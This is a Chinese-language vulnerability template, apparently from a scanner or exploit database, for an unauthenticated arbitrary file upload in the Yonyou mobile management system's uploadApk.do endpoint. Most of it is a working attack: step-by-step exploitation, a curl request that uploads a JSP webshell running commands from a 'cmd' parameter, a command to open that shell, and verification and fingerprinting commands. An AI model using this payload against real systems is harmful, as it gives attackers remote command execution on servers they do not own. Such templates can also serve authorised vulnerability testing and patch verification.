---
id: YONGYOU-MOBILE-UPLOAD
title: 用友移动管理系统 uploadApk.do 任意文件上传漏洞
product: yongyou
vendor: 用友网络
version_affected: "all versions"
severity: CRITICAL
tags: [file_upload, rce, 无需认证, 国产]
fingerprint: ["用友-移动系统管理", "maportal"]
---

## 漏洞描述

用友移动管理系统的 uploadApk.do 接口存在任意文件上传漏洞，攻击者无需认证即可通过 Multipart 请求上传任意文件（包括 JSP webshell），上传的文件保存在 `/maupload/apk/` 目录下，可直接访问执行。

## 影响版本

- 用友移动管理系统（所有已知版本）

## 前置条件

- 无需认证
- 目标运行用友移动管理系统

## 利用步骤

1. 确认目标运行用友移动管理系统
2. 向 `/maportal/appmanager/uploadApk.do` 发送 Multipart 上传请求
3. 上传 JSP webshell
4. 访问 `/maupload/apk/` 下的 webshell

## Payload

```bash
curl -s "http://target/maportal/appmanager/uploadApk.do?pk_obj=" \
  -X POST \
  -H "Content-Type: multipart/form-data; boundary=----Boundary" \
  -d '------Boundary
Content-Disposition: form-data; name="downloadpath"; filename="shell.jsp"
Content-Type: application/octet-stream

<% out.println("VULN_TEST"); Runtime.getRuntime().exec(request.getParameter("cmd")); %>
------Boundary--'
```

访问 webshell：

```bash
curl -s "http://target/maupload/apk/shell.jsp"
```

## 验证方法

```bash
# 上传测试文件
curl -s "http://target/maportal/appmanager/uploadApk.do?pk_obj=" \
  -X POST -H "Content-Type: multipart/form-data; boundary=----B" \
  -d '------B
Content-Disposition: form-data; name="downloadpath"; filename="test.jsp"
Content-Type: application/octet-stream

<% out.println("UPLOAD_OK"); %>
------B--'

# 验证
curl -s "http://target/maupload/apk/test.jsp" | grep "UPLOAD_OK"
```

## 指纹确认

```bash
curl -s "http://target/maportal/" | grep -i "用友\|移动管理"
curl -s "http://target/maportal/appmanager/" -o /dev/null -w "%{http_code}"
```
